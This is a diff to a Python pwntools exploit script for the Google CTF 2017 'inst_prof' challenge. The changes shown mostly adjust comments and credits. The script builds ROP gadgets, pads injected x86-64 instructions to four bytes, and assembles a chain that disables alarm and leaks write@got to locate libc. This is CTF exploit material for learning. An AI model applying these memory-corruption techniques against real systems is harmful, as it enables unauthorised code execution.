@@ -1,4 +1,6 @@
 # -*- coding: utf-8 -*-
+# from https://khack40.info - writeup
+
 import struct
 import sys
 import subprocess
@@ -10,13 +12,17 @@ import errno
 import time
 from pwn import *
 
-# pwntools - CTF framework
-# defuse.ca - online x86 assembler
-# https://khack40.info - writeup
 # https://dilsec.com - google ctf 2017 pwnables inst_prof writeup
 # WizardsOfDos' CTF writeup @ github
 
+# Gallopsled/pwntools
+# niklasb/lib-database
+# JonathanSalwan/ROPgadget
+# defuse.ca - online x86 assembler
+
 b = ELF('inst_prof')
+
+# leak a few GOT address & use lib-database to identify the version of libc
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
 context.arch = 'amd64'
@@ -30,12 +36,14 @@ r = remote('localhost', 8888)
 #raw_input('Go!')
 
 # $ ROPgadget --binary inst_prof
+#
 #0x0000000000000bc3 : pop rdi ; ret
 #0x0000000000000bc1 : pop rsi ; pop r15 ; ret
 
 pop_rdi = 0x0000000000000bc3
 pop_rsi = 0x0000000000000bc1 
 
+# pad to 4 bytes (inst_prof accepts only 4 bytes)
 def assemble(ASM):
     CODE = asm(ASM)
     if len(CODE) < 4:
@@ -86,14 +94,14 @@ if __name__ == "__main__":
     # now, r14 points just above the stack frame of do_test()
     r.clean()
 
-# leak the address of write@got
+# disable alaram & leak the address of write@got
 #
 # mov rdi, 0
-# jump to alarm@plt
+# call to alarm@plt
 # mov rdi, 1
 # mov rsi, addr of write@got
 # mov r15, 0
-# jump to write@plt
+# call to write@plt
 # jump to code_base+0x8c7
 
     ROP = p64(CODE_BASE + pop_rdi)
